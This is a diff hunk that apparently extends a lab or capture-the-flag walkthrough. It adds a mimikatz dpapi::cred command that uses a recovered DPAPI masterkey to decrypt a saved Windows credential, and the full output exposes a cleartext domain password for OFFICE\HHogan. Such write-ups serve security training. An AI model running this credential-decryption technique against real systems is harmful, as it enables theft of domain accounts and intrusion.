@@ -868,5 +868,65 @@ Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107
 I now have the key
 
 ```python
+PS C:\Users\PPotts\Documents> .\mimikatz.exe "dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" exit
 
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Enterprise Credential Data
+
+
+  algCrypt           : 00006603 - 26115 (CALG_3DES)
+  dwAlgCryptLen      : 000000c0 - 192
+  dwSaltLen          : 00000010 - 16
+  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         : 
+  algHash            : 00008004 - 32772 (CALG_SHA1)
+  dwAlgHashLen       : 000000a0 - 160
+  dwHmac2KeyLen      : 00000010 - 16
+  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
+  dwDataLen          : 000000c0 - 192
+  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
+  dwSignLen          : 00000014 - 20
+  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
+
+Decrypting Credential:
+ * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 000000be - 190
+  credUnk0       : 00000000 - 0
+
+  Type           : 00000002 - 2 - domain_password
+  Flags          : 00000000 - 0
+  LastWritten    : 5/9/2023 11:03:21 PM
+  unkFlagsOrSize : 00000018 - 24
+  Persist        : 00000003 - 3 - enterprise
+  AttributeCount : 00000000 - 0
+  unk0           : 00000000 - 0
+  unk1           : 00000000 - 0
+  TargetName     : Domain:interactive=OFFICE\HHogan
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : OFFICE\HHogan
+  CredentialBlob : H4ppyFtW183#
+  Attributes     : 0
+
+mimikatz(commandline) # exit
+Bye!
 ```
+The other two 
